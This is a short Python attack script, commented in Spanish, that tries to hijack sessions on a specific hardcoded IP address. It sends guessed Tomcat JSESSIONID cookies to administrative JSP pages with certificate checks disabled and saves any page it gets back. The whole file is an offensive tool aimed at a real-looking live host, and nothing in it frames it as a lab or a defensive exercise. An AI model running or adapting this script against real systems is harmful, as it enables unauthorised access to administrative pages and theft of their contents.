#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings()

def session_fixation_attack():
    target = "https://189.254.143.102"
    
    # Lista de sesiones predecibles comunes en Tomcat 6
    common_sessions = [
        "00000000000000000000000000000000",
        "1234567890ABCDEF1234567890ABCDEF",
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 
        "0123456789ABCDEF0123456789ABCDEF",
        "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
        "5AC92EC7B819B3474841A747FF58C063"
    ]
    
    print("=== SESSION FIXATION ATTACK ===")
    
    for session_id in common_sessions:
        # Probar acceso a aplicaciones con sesión fija
        endpoints = [
            "/jsp/menu.jsp",
            "/jsp/welcome.jsp",
            "/jsp/admin.jsp",
            "/jsp/administracion.jsp"
        ]
        
        for endpoint in endpoints:
            try:
                r = requests.get(
                    f"{target}{endpoint}",
                    cookies={'JSESSIONID': session_id},
                    verify=False,
                    timeout=5
                )
                
                if r.status_code == 200 and "error" not in r.text.lower():
                    print(f"✅ SESIÓN VÁLIDA: {session_id} en {endpoint}")
                    # Guardar contenido para análisis
                    with open(f"session_{session_id}_{endpoint.replace('/', '_')}.html", "w") as f:
                        f.write(r.text)
                        
            except Exception as e:
                continue

if __name__ == "__main__":
    session_fixation_attack()
